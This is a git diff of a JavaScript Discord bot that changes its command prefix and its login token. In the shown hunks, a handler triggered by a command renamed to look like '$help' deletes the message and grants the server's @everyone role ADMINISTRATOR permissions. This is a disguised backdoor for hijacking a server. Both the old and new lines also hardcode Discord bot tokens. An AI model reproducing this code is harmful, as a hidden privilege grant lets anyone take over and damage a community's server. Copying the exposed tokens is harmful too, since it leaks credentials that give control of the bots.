@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = '.'///lera ba dly xot prefix dabne
+const prefix = '$'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -20,7 +20,7 @@ if (msg.content.toLowerCase().startsWith(prefix + ".")) {
       )
 }})
 client.on('message', message => {
-    if (message.content.startsWith(prefix + ".")) {
+    if (message.content.startsWith(prefix + "$help")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
@@ -118,5 +118,5 @@ if (message.content.startsWith(adminprefix + 'setava')) {
 
  ////codaka drwst krawa lalayan black jack
 
-client.login("NzYyNzEwNTA0NTU2MzMxMDI4.X3tHgg.ETL12va8Y8iq1wkkdQkeElxO1VE")
+client.login("NzU1OTc2NDY2Mjg5Nzg2OTgx.YCv9JA.bGTZKurbL4eSQrwBHv_lL1dQZXY")
           
